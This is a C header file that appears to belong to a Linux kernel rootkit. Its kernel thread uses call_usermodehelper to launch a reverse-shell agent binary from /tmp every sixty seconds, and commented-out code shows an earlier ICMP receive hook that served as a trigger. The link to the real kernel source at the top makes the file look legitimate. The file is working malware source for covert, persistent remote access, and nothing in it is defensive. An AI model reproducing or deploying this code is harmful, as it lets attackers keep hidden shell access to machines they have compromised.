// https://github.com/torvalds/linux/blob/3b07108ada81a8ebcebf1fe61367b4e436c895bd/net/ipv4/icmp.c#L1198
#ifndef ICMP_RCV_H
#define ICMP_RCV_H
#include "../config.h"

int revshell_func(void *data) {
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL
    };
    char *argv[] = {"/tmp/revershell-agent.bin", NULL};

    while (!kthread_should_stop()) {
        // Execute revershell-agent.bin every minute
        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
        ssleep(60); // Sleep for 60 seconds (1 minute)
    }
    return 0;
}

// ICMP hook removed - revershell-agent.bin now runs automatically every minute
// static asmlinkage int(*original_icmp_rcv)(struct sk_buff *skb);
// static asmlinkage int icmp_rcv_hook(struct sk_buff *skb) {
//     // ICMP trigger logic removed since we run automatically every minute
//     return original_icmp_rcv(skb);
// }

#endif // !ICMP_RCV_H
